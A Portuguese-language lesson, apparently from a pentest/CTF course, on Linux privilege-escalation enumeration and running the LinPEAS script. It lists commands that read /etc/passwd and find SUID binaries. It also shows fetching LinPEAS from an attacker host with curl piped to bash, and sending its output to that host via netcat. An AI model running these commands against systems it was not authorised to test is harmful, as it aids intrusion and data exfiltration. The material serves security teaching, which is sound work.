# LinPEAS

➡️ [PDF da Aula](./pdf/LinPEAS.pdf) desenvolvido por [@rideckszz](https://github.com/rideckszz)

---


## 📖 Introdução

A elevação de privilégio é o processo de obter acesso a recursos restritos em um sistema comprometido, geralmente buscando privilégios administrativos (root).  

Esse processo é crucial em:
- Testes de intrusão  
- Competições CTF  
- Auditorias de segurança  

O primeiro passo para a escalada é a enumeração: coletar informações do sistema que possam revelar vulnerabilidades exploráveis.

## 🕵️ Questões Fundamentais na Enumeração

Após obter acesso inicial a um sistema Linux, é essencial verificar:

1. Versão do Sistema Operacional
```bash
cat /etc/os-release
```

2. Versão do Kernel
```bash
uname -a
```

3. Serviços em Execução (principalmente os rodando como root)
```bash
sudo -l
```

4. Usuários e Permissões
```bash
cat /etc/passwd
cat /etc/group
find / -perm -4000 2>/dev/null
```

5. Variáveis de Ambiente e PATH
```bash
env
echo $PATH
```

---

## ⚙️ Introdução ao LinPEAS

O LinPEAS é um script que automatiza a enumeração para elevação de privilégios em sistemas Linux/Unix/MacOS. Ele verifica configurações incorretas, vulnerabilidades conhecidas e possíveis caminhos de escalada.

➡️ Repositório oficial: [PEASS-ng](https://github.com/peass-ng/PEASS-ng)

### 🎨 Cores no LinPEAS

- 🟥 Vermelho/Amarelo → Quase certeza de possibilidade de elevação de privilégios
- 🟥 Vermelho → Configuração suspeita
- 🟩 Verde → Configuração segura (provavelmente)
- 🟦 Azul → Usuários sem shell & dispositivos montados
- 🟪 Magenta/Ciano → Destacam usuário atual e usuários com shell

### ▶️ Executando o LinPEAS

Existem diferentes métodos para executar o script do LinPEAS, dentre eles:

1. Via GitHub
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

2. Via Rede Local
```bash
# No host atacante
sudo python3 -m http.server 80

# Na máquina alvo
curl http://<IP_ATTACKER>/linpeas.sh | bash
```

3. Enviando saída para o host
```bash
# No host atacante
nc -lvnp 9002 | tee linpeas.out

# Na máquina alvo
curl http://<IP_ATTACKER>:8000/linpeas.sh | sh | nc <IP_ATTACKER> 9002
```

### 🔑 Principais Parâmetros

- `-a` → Executa todas as verificações (recomendado para CTFs)
- `-r` → Busca por chaves de API e padrões em arquivos
- `-s` → Modo rápido e discreto (não grava no disco)
- `-e` → Executa verificações extras
- `-P` → Fornece senha para sudo -l e brute force

